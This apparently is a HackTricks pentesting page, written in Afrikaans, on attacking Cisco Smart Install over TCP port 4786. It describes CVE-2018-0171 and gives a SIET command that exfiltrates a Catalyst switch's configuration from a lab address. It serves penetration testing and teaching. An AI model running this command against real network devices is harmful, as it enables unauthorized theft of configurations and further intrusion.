# 4786 - Cisco Smart Install

{{#include ../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Basiese Inligting

**Cisco Smart Install** is 'n Cisco ontwerp om die aanvanklike konfigurasie en laai van 'n bedryfstelselbeeld vir nuwe Cisco hardeware te outomatiseer. **Standaard is Cisco Smart Install aktief op Cisco hardeware en gebruik die vervoervlak protokol, TCP, met poortnommer 4786.**

**Standaard poort:** 4786
```
PORT      STATE  SERVICE
4786/tcp  open   smart-install
```
## **Slim Install Exploitasie Gereedskap**

**In 2018 is 'n kritieke kwesbaarheid, CVE-2018–0171, in hierdie protokol gevind. Die bedreigingsvlak is 9.8 op die CVSS-skaal.**

**'n Spesiaal saamgestelde pakket wat na die TCP/4786-poort gestuur word, waar Cisco Slim Install aktief is, veroorsaak 'n buffer oorgang, wat 'n aanvaller in staat stel om:**

- die toestel met geweld te herbegin
- RCE aan te roep
- konfigurasies van netwerktoerusting te steel.

**Die** [**SIET**](https://github.com/frostbits-security/SIET) **(Slim Install Exploitasie Gereedskap)** is ontwikkel om hierdie kwesbaarheid te benut, dit stel jou in staat om Cisco Slim Install te misbruik. In hierdie artikel sal ek jou wys hoe jy 'n wettige netwerkhardeware konfigurasiefilenaam kan lees. Konfigurasie eksfiltrasie kan waardevol wees vir 'n pentester omdat dit sal leer oor die unieke kenmerke van die netwerk. En dit sal die lewe vergemaklik en nuwe vektore vir 'n aanval vind.

**Die teiken toestel sal 'n “lewende” Cisco Catalyst 2960 skakel wees. Virtuele beelde het nie Cisco Slim Install nie, so jy kan slegs op die werklike hardeware oefen.**

Die adres van die teiken skakel is **10.10.100.10 en CSI is aktief.** Laai SIET en begin die aanval. **Die -g argument** beteken eksfiltrasie van die konfigurasie vanaf die toestel, **die -i argument** stel jou in staat om die IP-adres van die kwesbare teiken in te stel.
```
~/opt/tools/SIET$ sudo python2 siet.py -g -i 10.10.100.10
```
<figure><img src="../images/image (773).png" alt=""><figcaption></figcaption></figure>

Die skakelkonfigurasie **10.10.100.10** sal in die **tftp/** gids wees

<figure><img src="../images/image (1116).png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../banners/hacktricks-training.md}}
